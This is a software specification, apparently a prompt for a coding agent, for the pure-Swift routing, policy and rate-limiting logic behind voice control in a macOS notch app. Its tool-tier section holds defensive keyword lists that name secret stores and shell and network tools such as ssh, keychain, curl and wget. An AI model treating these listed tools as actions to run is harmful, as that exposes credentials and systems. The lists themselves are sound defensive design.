# WP-LOGIC: routing, policy, rate limiting and the session reducer

> Self-contained prompt for an external coding agent. You have NOT seen the conversation that produced this plan; everything
> you need is in this file and in the files it points to. Implementer: opencode (deepseek flash). This document is written
> for a model that needs explicit, example-driven specs: do the steps in order and do not skip the checks.

## 0. How to work

1. Read this whole file once. Then open `Sources/DesnotchCore/Voice/Contracts/VoiceTypes.swift` and read it completely: it
   defines every type you use. Do not edit it.
2. Work **one step at a time** (Step 1, 2, 3, 4). In each step: write the tests from the tables FIRST (copy the table rows
   literally into test code), run them (they fail), implement, run them (they pass), run the build, run lint. Only then go to
   the next step.
3. Every function in this package is **pure**: same inputs, same output. No `async`, no classes, no global mutable state, no
   `Date()`, no `UUID()`, no randomness, no `print`, no `import AppKit`. `import Foundation` only.
4. Where a table gives an expected value, your code must produce exactly that value. Where a table does not cover a case, the
   safe choice is to refuse (reject / deny / no-op).
5. **Test file boilerplate.** Every test file starts with `import XCTest` and `@testable import DesnotchCore`. Declare each
   test class on ONE line, `final class XTests: XCTestCase {` (the harness runner generator only recognises that shape). Put
   helper functions and fakes at column 0 AFTER the class, or indent them inside it (see the verification notes below). A
   `private` helper is not visible to another file: `VoiceReducerScenarioTests.swift` needs its own copies of `env`, `ctx` and
   `step`.
6. **Two sessions are fine.** The work splits cleanly: session 1 = Step 1 and Step 2 (router chain, policy, tool tiers,
   scanner, rate limiter); session 2 = Steps 3 and 4 (the reducer), started with a fresh context. Each session ends with its own
   build, harness and lint run. The ownership check (`scripts/voice-harness/check-ownership.sh WP-LOGIC`) is run at the very end.
7. **Regex.** `try!` is forbidden, and `NSRegularExpression(pattern:)` throws. Use `String.range(of: pattern, options: .regularExpression)`
   with raw-string pattern constants (`#"..."#`) instead; the scanner patterns are given as constants in Step 2c.

## 1. Background (just enough)

desnotch is a macOS menu-bar "notch" app written in Swift (SwiftPM, macOS 13+, one library target `DesnotchCore`). We are adding
**voice control** behind an off-by-default setting. The user holds a key, speaks, and a short pipeline runs:

```
speech -> final transcript -> IntentRouter -> (local action | cloud agent) -> policy/approval -> result
```

You write the **brain** of that pipeline as pure functions, so it can be tested without a microphone or a screen:
`IntentRouter` (text -> what to do), `ConfirmationPolicy` / `ToolTierTable` / `CommandRiskScanner` (how dangerous is it),
`RateLimiter`, and `VoiceReducer` (the session state machine). Other people write the microphone code, the UI and the
agent connection; they call your functions. The names, argument labels and types in this file are exact because
they already exist as compiling stubs that others build against.

Safety principles you are implementing (they explain why the tables look the way they do):

- A spoken sentence only runs locally if the **whole** sentence matches a fixed phrase. No guessing, no fuzzy matching.
- Unknown things are **denied by default** (unknown tool = tier 3 = blocked).
- Nothing leaves the Mac to the cloud agent unless the user ended the recording with a key action and the transcript sat in a
  1.5 second review window.
- No spoken word can ever approve anything. Approvals are button presses bound to a random nonce.
- Time and randomness are passed IN (`VoiceReducerEnv.now`, `.freshNonce`) so tests are exact.

## 2. Files

You own exactly these files. The first eight source files already exist as stubs with the final signatures; replace the stub
bodies, keep the signatures. Everything else you may NOT create or edit.

| File | Content |
|---|---|
| `Sources/DesnotchCore/Voice/Logic/UtteranceNormalizer.swift` | `UtteranceNormalizer.tokens` (Step 1a) |
| `Sources/DesnotchCore/Voice/Logic/SpokenNumber.swift` | `SpokenNumber.parse` (Step 1b) |
| `Sources/DesnotchCore/Voice/Logic/AppCatalog.swift` | `AppCatalog.lookup` (Step 1c) |
| `Sources/DesnotchCore/Voice/Logic/IntentRouter.swift` | `IntentRouter.route` (Step 1d) |
| `Sources/DesnotchCore/Voice/Logic/ConfirmationPolicy.swift` | `ConfirmationPolicy`, `ToolTierTable` (Steps 2a, 2b) |
| `Sources/DesnotchCore/Voice/Logic/CommandRiskScanner.swift` | `CommandRiskScanner.scan` (Step 2c) |
| `Sources/DesnotchCore/Voice/Logic/RateLimiter.swift` | `RateLimiter.tryConsume` body (Step 2d) |
| `Sources/DesnotchCore/Voice/Logic/VoiceReducer.swift` | `VoiceReducer.reduce` (Steps 3 and 4) |
| `Tests/DesnotchCoreTests/Voice/Logic/UtteranceNormalizerTests.swift` | class `UtteranceNormalizerTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/SpokenNumberTests.swift` | class `SpokenNumberTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/AppCatalogTests.swift` | class `AppCatalogTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/IntentRouterTests.swift` | class `IntentRouterTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/ConfirmationPolicyTests.swift` | class `ConfirmationPolicyTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/ToolTierTableTests.swift` | class `ToolTierTableTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/CommandRiskScannerTests.swift` | class `CommandRiskScannerTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/RateLimiterTests.swift` | class `RateLimiterTests` |
| `Tests/DesnotchCoreTests/Voice/Logic/VoiceReducerRuleTests.swift` | class `VoiceReducerRuleTests` (one test per rule ID) |
| `Tests/DesnotchCoreTests/Voice/Logic/VoiceReducerScenarioTests.swift` | class `VoiceReducerScenarioTests` (end-to-end scripts) |

Test classes must use exactly these names (the harness and the reviewers filter by class name).

## 3. The contract you consume (read `Contracts/VoiceTypes.swift`)

You use these types; they are final: `VoiceTier`, `VoiceLane`, `CaptureMode`, `VoiceState`, `VoiceTimerKind`, `VoiceCue`,
`VoiceStep`, `PauseReason`, `InterruptCapture`, `VoiceContext`, `VoiceReducerEnv`, `VoiceEvent`, `VoiceEffect`,
`VoiceTransition`, `LocalIntent`, `RouteDecision`, `RejectReason`, `RouterContext`, `PolicyDecision`, `DenyReason`,
`RiskFlags`, `CommandRisk`, `ConfirmationRequest`, `AgentEvent`, `AuditDraft`, `AuditKind`, `LocalExecutionResult`,
`VoiceFailure`, `VoiceTiming`, `VoiceLimits`, and `RateVerdict` / `RateLimiter` (in `Logic/RateLimiter.swift`).
`VoiceContext.init()` gives an idle context; `VoiceReducerEnv.init(now:...)` has defaults for everything but `now`.

### Step 1: the router chain (four small pure files)

Files, in the order to write them (each has its own tests and its own "done" check):

1. `Logic/UtteranceNormalizer.swift`: `UtteranceNormalizer.tokens(_ raw: String) -> [String]`
2. `Logic/SpokenNumber.swift`: `SpokenNumber.parse(_ tokens: [String], at start: Int) -> (value: Int, length: Int)?`
3. `Logic/AppCatalog.swift`: `AppCatalog.lookup(_ tokens: [String]) -> AppCatalog.Entry?`
4. `Logic/IntentRouter.swift`: `IntentRouter.route(_ utterance: String, context: RouterContext) -> RouteDecision`

All four already exist as stubs with these exact signatures. Keep the signatures. Keep the file names.

#### 1a. `UtteranceNormalizer.tokens`

Algorithm (do exactly this, in this order):

1. `lowered = raw.lowercased()`.
2. Build a new string where every `Character` that is not a letter and not a number
   (`!(c.isLetter || c.isNumber)`) is replaced by a single space. (So `"30%"` -> `"30 "`,
   `"twenty-five"` -> `"twenty five"`, `"what's"` -> `"what s"`.)
3. Split on spaces, drop empty pieces. This is `words`.
4. **Leading fillers**: while `words.first` is in `leadingFillers`, remove it.
5. **Trailing fillers**: while `words.last` is in `trailingFillers`, remove it.
6. Return `words`.

```swift
static let leadingFillers: Set<String> = [
    "please", "tolong", "hey", "hi", "ok", "okay", "kindly", "desnotch",
    "um", "uh", "hmm", "eh", "ehm", "emm", "ah", "err"
]
static let trailingFillers: Set<String> = [
    "please", "tolong", "dong", "ya", "deh", "aja", "saja", "now", "sekarang",
    "thanks", "thx", "um", "uh", "hmm"
]
```

Worked examples (write each as its OWN test method named `testN<n>_<slug>`, `testN1_play` ... `testN14_repeatedFillers`, asserting `tokens(raw) == expected`; the numbers are the `N` of the table, and `scripts/voice-harness/check-rule-tests.sh` fails when one is missing):

| # | raw | expected |
|---|---|---|
| N1 | `"Play"` | `["play"]` |
| N2 | `"  PAUSE music, please. "` | `["pause", "music"]` |
| N3 | `"Volume to 30%"` | `["volume", "to", "30"]` |
| N4 | `"twenty-five"` | `["twenty", "five"]` |
| N5 | `"hey desnotch volume 20"` | `["volume", "20"]` |
| N6 | `"tolong buka safari dong"` | `["buka", "safari"]` |
| N7 | `"um"` | `[]` |
| N8 | `"please"` | `[]` |
| N9 | `""` | `[]` |
| N10 | `"What's the weather?"` | `["what", "s", "the", "weather"]` |
| N11 | `"Open the Pod Bay Doors, now!"` | `["open", "the", "pod", "bay", "doors"]` |
| N12 | `"un-mute"` | `["un", "mute"]` |
| N13 | `"Buka   aplikasi\nKalender"` | `["buka", "aplikasi", "kalender"]` |
| N14 | `"okay okay volume 5"` | `["volume", "5"]` |

#### 1b. `SpokenNumber.parse`

`parse(tokens, at: start)` returns the **longest** number that begins at `tokens[start]`, as
`(value, length)` where `length` is how many tokens were used. Return `nil` when `start` is out of
range or no number starts there. It never reads before `start`.

Rules:

1. **Digits**: a token made only of ASCII digits `0-9`, 1 to 3 characters long, is a number
   (`"007"` is 7). A token with 4 or more digits is NOT a number (`nil`). Length 1.
2. **English words**:
   - units/teens: `zero 0, one 1, two 2, three 3, four 4, five 5, six 6, seven 7, eight 8, nine 9, ten 10, eleven 11, twelve 12, thirteen 13, fourteen 14, fifteen 15, sixteen 16, seventeen 17, eighteen 18, nineteen 19`
   - tens: `twenty 20, thirty 30, forty 40, fifty 50, sixty 60, seventy 70, eighty 80, ninety 90`
   - a tens word may be followed by a unit word `one`...`nine` (NOT `zero`, not teens, not tens): the value is the sum and the length is 2. Example `twenty five` = 25.
   - `hundred` = 100 (length 1); `one hundred` = 100 (length 2); `a hundred` = 100 (length 2). Nothing larger and no "hundred and ..." forms.
3. **Indonesian words**:
   - `nol 0, kosong 0, satu 1, dua 2, tiga 3, empat 4, lima 5, enam 6, tujuh 7, delapan 8, sembilan 9, sepuluh 10, sebelas 11, seratus 100`
   - `<unit 2-9> belas` = 10 + unit (12-19), length 2. (`satu belas` is not valid: `nil` for that pair, but `satu` alone still parses as 1.)
   - `<unit 2-9> puluh` = 10 * unit (20-90), length 2; optionally followed by a unit `satu`...`sembilan` (length 3). Example `dua puluh lima` = 25.
4. Always prefer the longest valid match at `start`.

`XCTAssertEqual` cannot compare a labelled-tuple optional, so every S-row goes through this helper (copy it to the bottom of
`SpokenNumberTests.swift`, at column 0 after the class; `expected == nil` means "must be nil"):

```swift
func assertParse(_ tokens: [String], _ start: Int, _ expected: (Int, Int)?,
                 file: StaticString = #filePath, line: UInt = #line) {
    let result = SpokenNumber.parse(tokens, at: start)
    XCTAssertEqual(result == nil, expected == nil, "nil-ness of \(tokens) at \(start)", file: file, line: line)
    if let result, let expected {
        XCTAssertEqual(result.value, expected.0, file: file, line: line)
        XCTAssertEqual(result.length, expected.1, file: file, line: line)
    }
}
```

Worked examples (write each as its OWN test method named `testS<n>_<slug>`, `testS1_` ... `testS34_`, where `S<n>` is the row number below; each calls `assertParse`; `check-rule-tests.sh` fails when one is missing. Do not confuse these with the reducer scenarios, which are `testScenarioS<n>_`):

| # | tokens | start | expected |
|---|---|---|---|
| S1 | `["5"]` | 0 | `(5, 1)` |
| S2 | `["30", "percent"]` | 0 | `(30, 1)` |
| S3 | `["100"]` | 0 | `(100, 1)` |
| S4 | `["250"]` | 0 | `(250, 1)` |
| S5 | `["1000"]` | 0 | `nil` |
| S6 | `["zero"]` | 0 | `(0, 1)` |
| S7 | `["nol"]` | 0 | `(0, 1)` |
| S8 | `["ten"]` | 0 | `(10, 1)` |
| S9 | `["thirteen"]` | 0 | `(13, 1)` |
| S10 | `["twenty"]` | 0 | `(20, 1)` |
| S11 | `["twenty", "five", "percent"]` | 0 | `(25, 2)` |
| S12 | `["ninety", "nine"]` | 0 | `(99, 2)` |
| S13 | `["hundred"]` | 0 | `(100, 1)` |
| S14 | `["one", "hundred"]` | 0 | `(100, 2)` |
| S15 | `["a", "hundred"]` | 0 | `(100, 2)` |
| S16 | `["twenty", "ten"]` | 0 | `(20, 1)` |
| S17 | `["five", "five"]` | 0 | `(5, 1)` |
| S18 | `["fifteen", "minutes"]` | 0 | `(15, 1)` |
| S19 | `["sepuluh"]` | 0 | `(10, 1)` |
| S20 | `["sebelas"]` | 0 | `(11, 1)` |
| S21 | `["dua", "belas"]` | 0 | `(12, 2)` |
| S22 | `["lima", "belas"]` | 0 | `(15, 2)` |
| S23 | `["satu", "belas"]` | 0 | `(1, 1)` |
| S24 | `["dua", "puluh"]` | 0 | `(20, 2)` |
| S25 | `["dua", "puluh", "lima"]` | 0 | `(25, 3)` |
| S26 | `["tujuh", "puluh", "persen"]` | 0 | `(70, 2)` |
| S27 | `["seratus"]` | 0 | `(100, 1)` |
| S28 | `["volume", "30"]` | 1 | `(30, 1)` |
| S29 | `["volume", "30"]` | 0 | `nil` |
| S30 | `["banana"]` | 0 | `nil` |
| S31 | `[]` | 0 | `nil` |
| S32 | `["30"]` | 5 | `nil` |
| S33 | `["x5"]` | 0 | `nil` |
| S34 | `["lima", "puluh"]` | 0 | `(50, 2)` |

#### 1c. `AppCatalog.lookup`

A fixed table; **exact** token-sequence match only (the whole `tokens` array must equal one alias).
No prefix, substring or fuzzy matching. `lookup([])` is `nil`.

| Alias token sequence(s) | `bundleID` | `displayName` |
|---|---|---|
| `safari` | `com.apple.Safari` | Safari |
| `chrome`; `google chrome` | `com.google.Chrome` | Chrome |
| `terminal` | `com.apple.Terminal` | Terminal |
| `iterm`; `iterm2` | `com.googlecode.iterm2` | iTerm |
| `finder` | `com.apple.finder` | Finder |
| `notes` | `com.apple.Notes` | Notes |
| `calendar`; `kalender` | `com.apple.iCal` | Calendar |
| `reminders` | `com.apple.reminders` | Reminders |
| `music` | `com.apple.Music` | Music |
| `spotify` | `com.spotify.client` | Spotify |
| `messages`; `pesan` | `com.apple.MobileSMS` | Messages |
| `mail` | `com.apple.mail` | Mail |
| `system settings`; `settings`; `system preferences` | `com.apple.systempreferences` | System Settings |
| `activity monitor` | `com.apple.ActivityMonitor` | Activity Monitor |
| `calculator`; `kalkulator` | `com.apple.calculator` | Calculator |
| `preview` | `com.apple.Preview` | Preview |
| `vs code`; `vscode`; `visual studio code` | `com.microsoft.VSCode` | Visual Studio Code |
| `notion` | `notion.id` | Notion |

Tests: one per row (each alias returns the entry; 18 rows, 27 aliases), plus: `lookup(["safar"])` is nil, `lookup(["safari", "browser"])`
is nil, `lookup(["activity"])` is nil, `lookup([])` is nil, every `bundleID` is non-empty and
contains a `.` and no spaces, and no two rows share a `bundleID` with different display names.

#### 1d. `IntentRouter.route`

```swift
static func route(_ utterance: String, context: RouterContext) -> RouteDecision
```

`RouterContext` has `hermesLaneAvailable` and `agentBusy`. Algorithm (do exactly this, in this order, first
hit returns):

1. `trimmed = utterance` trimmed of whitespace and newlines. Empty -> `.reject(.emptyUtterance)`.
2. `trimmed.count > 500` (`VoiceLimits.maxUtteranceCharacters`) -> `.reject(.tooLong)`.
3. `tokens = UtteranceNormalizer.tokens(trimmed)`. Empty -> `.reject(.emptyUtterance)`.
4. `tokens` equals one of the **emergency phrases** -> `.emergencyStop`.
5. `context.agentBusy` and `tokens` equals one of the **cancel-turn phrases** -> `.cancelTurn`.
6. Compute the **small-modifier variant**: if `tokens` ends with `["a","bit"]`, `["a","little"]`, `["slightly"]`,
   `["sedikit"]` or `["dikit"]`, let `stripped` be `tokens` without that ending and `small = true`; otherwise `small = false`.
   (`stripped` is used only in rule 10. Rules 7, 8, 9 and 11 always use the original `tokens`.)
7. **Volume set** (see grammar below). Match -> `.local(.volumeSet(percent: n))` if `0...100`, else `.reject(.invalidArgument)`.
8. **Timer start** (grammar below). Match -> `.local(.timerStart(minutes: n))` if `1...120`, else `.reject(.invalidArgument)`.
9. **Open app** (grammar below). Match -> `.local(.openApp(bundleID:, name:))` from `AppCatalog`.
10. **Fixed phrases** (table below). First, if `small` and `stripped` equals a volume-step phrase -> that step with
    magnitude `5` (`VoiceLimits.volumeStepSmall`). Then, if the original `tokens` equal any listed sequence -> that intent
    (volume steps use magnitude `10`, `VoiceLimits.volumeStep`). The bare phrase `["cancel"]` (agent not busy) ->
    `.reject(.ambiguous)`.
11. **Attempted-command shapes** (these stop a half-parsed command from silently going to the cloud):
    - First token in `open, launch, buka, jalankan`: one token -> `.reject(.ambiguous)`; 2 to 5 tokens -> `.reject(.unknownApp)`.
    - First token `volume`, or first token in `set, atur, setel, ubah, change` with `volume` as token 2 or 3: one token ->
      `.reject(.ambiguous)`; up to 6 tokens -> `.reject(.invalidArgument)`.
    - First token `timer`, or first token in `set, start, setel, pasang, atur` with `timer` as token 2 or 3: one token ->
      `.reject(.ambiguous)`; up to 8 tokens -> `.reject(.invalidArgument)`.
12. **Miss**: `context.hermesLaneAvailable` -> `.remote(utterance: trimmed)` (the ORIGINAL trimmed text, not the tokens);
    otherwise `.reject(.notLocalCommand)`.

**Emergency phrases** (token sequences): `abort agent`; `abort the agent`; `abort agents`; `batalkan agent`; `batalkan agen`.

**Cancel-turn phrases** (only when `agentBusy`): `stop`; `cancel`; `stop it`; `cancel that`; `cancel it`; `batal`; `berhenti`; `hentikan`.

**Fixed phrases** (each line is one exact token sequence; `/` separates alternatives):

| Intent | English | Indonesian |
|---|---|---|
| `.mediaPlay` | `play`; `play music`; `play song`; `resume`; `resume music`; `resume playback`; `unpause`; `continue`; `continue playing` | `putar`; `putar musik`; `mainkan`; `mainkan musik`; `lanjut`; `lanjutkan`; `lanjutkan musik` |
| `.mediaPause` | `pause`; `pause music`; `pause playback`; `stop`; `stop music`; `stop playing`; `stop the music` | `jeda`; `jeda musik`; `berhenti`; `hentikan musik`; `matikan musik` |
| `.mediaNext` | `next`; `next track`; `next song`; `skip`; `skip track`; `skip song`; `skip this song`; `skip this track` | `berikutnya`; `selanjutnya`; `lagu berikutnya`; `lagu selanjutnya` |
| `.mediaPrevious` | `previous`; `previous track`; `previous song`; `last song`; `last track`; `go back` | `sebelumnya`; `lagu sebelumnya` |
| `.mute` | `mute`; `mute volume`; `mute sound`; `mute audio` | `bisukan`; `bisukan suara` |
| `.unmute` | `unmute`; `unmute volume`; `unmute sound`; `unmute audio`; `un mute` | `nyalakan suara`; `buka bisu` |
| `.volumeStep(+)` | `volume up`; `louder`; `turn it up`; `turn up`; `turn up the volume`; `turn the volume up`; `volume higher`; `increase volume`; `raise volume`; `raise the volume` | `volume naik`; `naikkan volume`; `besarkan volume`; `keraskan`; `keraskan volume`; `tambah volume` |
| `.volumeStep(-)` | `volume down`; `quieter`; `softer`; `turn it down`; `turn down`; `turn down the volume`; `turn the volume down`; `volume lower`; `decrease volume`; `lower volume`; `lower the volume`; `reduce volume` | `volume turun`; `turunkan volume`; `kecilkan volume`; `pelankan`; `pelankan volume`; `kurangi volume` |
| `.timerCancel` | `cancel timer`; `cancel the timer`; `stop timer`; `stop the timer`; `clear timer` | `batalkan timer`; `hentikan timer`; `matikan timer`; `batal timer` |

(Note `stop`, `berhenti` and `hentikan musik` appear both as cancel-turn phrases and as `.mediaPause`: rule 5 wins
only when `agentBusy` is true.)

**Volume-set grammar** (the WHOLE `tokens` array must be consumed):
`PREFIX [to|ke|jadi] NUMBER [percent|persen]` where `PREFIX` is one of `volume`; `set volume`; `set the volume`;
`change volume`; `change the volume`; `atur volume`; `setel volume`; `ubah volume`. `NUMBER` is `SpokenNumber.parse`
at the position right after the optional `to/ke/jadi`, and must end exactly before the optional `percent/persen`
which must be the last token. Any leftover token means no match.

**Timer grammar** (whole array consumed; `NUMBER` via `SpokenNumber.parse`; `UNIT` is one of `minute, minutes, min, mins, menit`):
- Form 1: `TIMERHEAD [for|selama|untuk] NUMBER UNIT` where `TIMERHEAD` is `timer`; `set timer`; `set a timer`; `start timer`;
  `start a timer`; `setel timer`; `pasang timer`; `atur timer`. (`for|selama|untuk` is optional here.)
- Form 2, two shapes, written without optional-bracket ambiguity:
  - (2a) `PREFIX NUMBER UNIT [timer]` where `PREFIX` is `set a` or `start a`. The prefix is REQUIRED; the trailing word `timer` is optional (`set a five minutes` and `set a 25 minute timer` both match).
  - (2b) `NUMBER UNIT timer` with NO prefix. The trailing word `timer` is REQUIRED (`25 minute timer`, `ten minutes timer`).
  So the rule is: the prefix is required unless the trailing `timer` word is present, and a bare `NUMBER UNIT` with neither (`5 minutes`, `ten minutes`) is NOT a timer command (it falls through to the miss rule: `.reject(.notLocalCommand)` in context A, `.remote` in context B). `minute` and `min` are singular forms of `UNIT` and need no number agreement.

**Open-app grammar** (whole array consumed): `VERB [the|a|aplikasi] NAME [app|application|aplikasi]` where `VERB` is
`open`; `open up`; `launch`; `buka`; `jalankan`, and `NAME` is the whole remainder (1 to 3 tokens) and satisfies
`AppCatalog.lookup(NAME) != nil`. There is no search over sub-ranges: `NAME` is what is left after the verb and the stripping below.
Strip at most ONE leading article (`the`, `a`, `aplikasi`) and at most ONE trailing suffix
(`app`, `application`, `aplikasi`), and strip the suffix only when the remainder is non-empty (so `open the app` has `NAME = ["app"]`, which
is not in the catalog). If `NAME` is not in the catalog the grammar does not match (rule 11 then gives `.unknownApp`).

#### Router worked examples

Contexts: **A** = `RouterContext()` (lane unavailable, not busy); **B** = lane available; **C** = agent busy
(lane unavailable). Every row is one test method named `testRouter_<n>_<slug>` (`<n>` = the `#` below, for example `testRouter_13_volumeThirty`, `testRouter_72_tenMinutesTimer`); `check-rule-tests.sh` fails when one of 1 to 72 is missing. `local(...)` is `.local(...)`.

| # | Utterance | Ctx | Expected |
|---|---|---|---|
| 1 | `Play` | A | `.local(.mediaPlay)` |
| 2 | `  PAUSE music, please. ` | A | `.local(.mediaPause)` |
| 3 | `stop` | A | `.local(.mediaPause)` |
| 4 | `stop` | C | `.cancelTurn` |
| 5 | `cancel` | A | `.reject(.ambiguous)` |
| 6 | `cancel` | C | `.cancelTurn` |
| 7 | `cancel the timer` | A | `.local(.timerCancel)` |
| 8 | `abort agent` | A | `.emergencyStop` |
| 9 | `Abort the agent!` | C | `.emergencyStop` |
| 10 | `next song` | A | `.local(.mediaNext)` |
| 11 | `skip` | A | `.local(.mediaNext)` |
| 12 | `previous track` | A | `.local(.mediaPrevious)` |
| 13 | `volume 30` | A | `.local(.volumeSet(percent: 30))` |
| 14 | `set the volume to thirty percent` | A | `.local(.volumeSet(percent: 30))` |
| 15 | `volume to twenty five` | A | `.local(.volumeSet(percent: 25))` |
| 16 | `volume twenty-five` | A | `.local(.volumeSet(percent: 25))` |
| 17 | `volume to 100` | A | `.local(.volumeSet(percent: 100))` |
| 18 | `volume zero` | A | `.local(.volumeSet(percent: 0))` |
| 19 | `volume 150` | A | `.reject(.invalidArgument)` |
| 20 | `volume` | A | `.reject(.ambiguous)` |
| 21 | `volume to` | A | `.reject(.invalidArgument)` |
| 22 | `set volume to banana` | A | `.reject(.invalidArgument)` |
| 23 | `louder` | A | `.local(.volumeStep(delta: 10))` |
| 24 | `turn it down a bit` | A | `.local(.volumeStep(delta: -5))` |
| 25 | `volume up a little` | A | `.local(.volumeStep(delta: 5))` |
| 26 | `quieter` | A | `.local(.volumeStep(delta: -10))` |
| 27 | `mute` | A | `.local(.mute)` |
| 28 | `un-mute` | A | `.local(.unmute)` |
| 29 | `open Safari` | A | `.local(.openApp(bundleID: "com.apple.Safari", name: "Safari"))` |
| 30 | `please open the activity monitor app` | A | `.local(.openApp(bundleID: "com.apple.ActivityMonitor", name: "Activity Monitor"))` |
| 31 | `launch VS Code` | A | `.local(.openApp(bundleID: "com.microsoft.VSCode", name: "Visual Studio Code"))` |
| 32 | `open sofari` | A | `.reject(.unknownApp)` |
| 33 | `open` | A | `.reject(.ambiguous)` |
| 34 | `open the pod bay doors` | B | `.reject(.unknownApp)` (5 tokens: still an attempted launch, never the cloud) |
| 35 | `open my latest nmap scan results in a text editor` | B | `.remote(utterance: "open my latest nmap scan results in a text editor")` |
| 36 | `timer 10 minutes` | A | `.local(.timerStart(minutes: 10))` |
| 37 | `set a timer for five minutes` | A | `.local(.timerStart(minutes: 5))` |
| 38 | `set a 25 minute timer` | A | `.local(.timerStart(minutes: 25))` |
| 39 | `timer 0 minutes` | A | `.reject(.invalidArgument)` |
| 40 | `timer 500 minutes` | A | `.reject(.invalidArgument)` |
| 41 | `timer` | A | `.reject(.ambiguous)` |
| 42 | `timer ten` | A | `.reject(.invalidArgument)` |
| 43 | `putar musik` | A | `.local(.mediaPlay)` |
| 44 | `jeda` | A | `.local(.mediaPause)` |
| 45 | `lagu berikutnya` | A | `.local(.mediaNext)` |
| 46 | `volume ke lima puluh persen` | A | `.local(.volumeSet(percent: 50))` |
| 47 | `atur volume jadi tujuh puluh` | A | `.local(.volumeSet(percent: 70))` |
| 48 | `kecilkan volume sedikit` | A | `.local(.volumeStep(delta: -5))` |
| 49 | `buka aplikasi kalender` | A | `.local(.openApp(bundleID: "com.apple.iCal", name: "Calendar"))` |
| 50 | `setel timer lima belas menit` | A | `.local(.timerStart(minutes: 15))` |
| 51 | `batalkan timer` | A | `.local(.timerCancel)` |
| 52 | `batalkan agent` | A | `.emergencyStop` |
| 53 | `What's the weather in Jakarta?` | A | `.reject(.notLocalCommand)` |
| 54 | `What's the weather in Jakarta?` | B | `.remote(utterance: "What's the weather in Jakarta?")` |
| 55 | `` (empty) | A | `.reject(.emptyUtterance)` |
| 56 | `   ` | A | `.reject(.emptyUtterance)` |
| 57 | `um` | A | `.reject(.emptyUtterance)` |
| 58 | `String(repeating: "x", count: 501)` | A | `.reject(.tooLong)` |
| 59 | `play something by Radiohead` | A | `.reject(.notLocalCommand)` |
| 60 | `play something by Radiohead` | B | `.remote(utterance: "play something by Radiohead")` |
| 61 | `pause the scan` | B | `.remote(utterance: "pause the scan")` |
| 62 | `stop the scan` | C | `.reject(.notLocalCommand)` |
| 63 | `hey desnotch volume 20` | A | `.local(.volumeSet(percent: 20))` |
| 64 | `tolong buka safari dong` | A | `.local(.openApp(bundleID: "com.apple.Safari", name: "Safari"))` |
| 65 | `pause a bit` | A | `.reject(.notLocalCommand)` (a small modifier on a non-volume phrase is not stripped) |
| 66 | `mute the TV` | A | `.reject(.notLocalCommand)` |
| 67 | `volume up` | C | `.local(.volumeStep(delta: 10))` |
| 68 | `hentikan` | C | `.cancelTurn` |
| 69 | `hentikan` | A | `.reject(.notLocalCommand)` |
| 70 | `set a timer for an hour` | A | `.reject(.invalidArgument)` (attempted shape, no valid unit) |
| 71 | `5 minutes` | A | `.reject(.notLocalCommand)` (form 2 needs a prefix or the trailing `timer`) |
| 72 | `ten minutes timer` | A | `.local(.timerStart(minutes: 10))` (form 2b) |

Edge-case notes for the tests: row 3 vs row 4 shows rule 5 beating rule 10; row 34 vs 35 shows the 5-token cap of
rule 11; row 65 shows that a small modifier only counts for volume-step phrases; rows 71 and 72 show that a bare `NUMBER UNIT` is not a timer but `NUMBER UNIT timer` is. Do not add behaviors that are not in this table or in the rules above.

### Step 2: policy, tool tiers, command scanner, rate limiter

#### 2a. `Logic/ConfirmationPolicy.swift`: `ConfirmationPolicy`

```swift
static func tier(of intent: LocalIntent) -> VoiceTier
static func decide(tier: VoiceTier, secondFactorAvailable: Bool) -> PolicyDecision
```

`tier(of:)` table (one test per row; `VoiceLimits.volumeConfirmAbove` is 70):

| Intent | Tier |
|---|---|
| `.mediaPlay`, `.mediaPause`, `.mediaNext`, `.mediaPrevious` | `.t0` |
| `.volumeSet(percent: 0)` ... `.volumeSet(percent: 70)` | `.t0` |
| `.volumeSet(percent: 71)` ... `.volumeSet(percent: 100)` | `.t2` |
| `.volumeSet(percent: n)` with `n < 0` or `n > 100` | `.t4` (fail closed; the router never produces it) |
| `.volumeStep(delta: any)`, `.mute`, `.unmute` | `.t0` |
| `.openApp(...)` | `.t0` |
| `.timerStart(minutes: 1)` ... `.timerStart(minutes: 120)` | `.t0` |
| `.timerStart(minutes: n)` outside `1...120` | `.t4` |
| `.timerCancel` | `.t0` |

`decide(tier:secondFactorAvailable:)` table (all 10 combinations are tests):

| tier | secondFactorAvailable | result |
|---|---|---|
| `.t0` | any | `.allow` |
| `.t1` | any | `.allow` |
| `.t2` | any | `.confirm` |
| `.t3` | `false` | `.deny(.secondFactorUnavailable)` |
| `.t3` | `true` | `.confirm` |
| `.t4` | any | `.deny(.tierT4)` |

#### 2b. `Logic/ConfirmationPolicy.swift`: `ToolTierTable`

```swift
static func tier(forTool kind: String) -> VoiceTier
```

`kind` is a category label for a Hermes tool (WP-HERMES maps real tool names into it). The table is
**default-deny**: anything not explicitly known is `.t3`, and `.t3`/`.t4` tools trip the reducer's tripwire (R83).

Algorithm, in order, first hit returns:

1. `lowered = kind.lowercased()`. If `lowered.trimmingCharacters(in: .whitespaces)` is empty -> `.t3`.
2. If `lowered` **contains** (substring) any of
   `interseptor, vault, engagement, ssh, keychain, credential, secret, password, token, auth, sudo, hermes, evidence, finding` -> `.t4`.
3. If `lowered` **equals** one of `clock, current_time, get_time, time, calculator, now_playing` -> `.t0`.
   If `lowered` equals one of the entries of `explicitT1` (declare `static let explicitT1: Set<String> = []`; it stays
   EMPTY in the MVP: the voice profile has no T1 tools, and adding names later is a contract amendment) -> `.t1`.
4. `words` = `lowered` split on every character that is not a letter or digit, empty pieces dropped.
   If any word is in
   `terminal, shell, bash, sh, zsh, exec, execute, run, curl, wget, http, https, fetch, web, browser, search, network, send, post, email, message, computer, click, screenshot, cron, kanban, mcp, docker, git`
   -> `.t3`.
5. If any word is in `write, edit, patch, delete, remove, rm, move, mv, rename, kill, create, copy, cp, read, list` -> `.t2`.
6. Otherwise -> `.t3`.

Worked examples (one test METHOD each, named `testT<n>_<slug>`, `testT1_clock` ... `testT32_trailingSpaceIsNotTrimmed`; `check-rule-tests.sh` enforces 1 to 32):

| # | kind | tier | why |
|---|---|---|---|
| T1 | `clock` | `.t0` | explicit |
| T2 | `Calculator` | `.t0` | explicit, case-insensitive |
| T3 | `get_time` | `.t0` | explicit |
